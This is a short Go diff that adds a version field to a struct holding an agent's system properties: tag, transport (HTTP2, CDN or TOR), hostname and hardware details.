@@ -184,6 +184,7 @@ type Config struct {
 // SystemInfo agent properties
 type SystemInfo struct {
 	Tag         string        `json:"Tag"`         // identifier of the agent
+	Version     string        `json:"Version"`     // agent version
 	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
 	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
 	Hardware    string        `json:"Hardware"`    // machine details and hypervisor
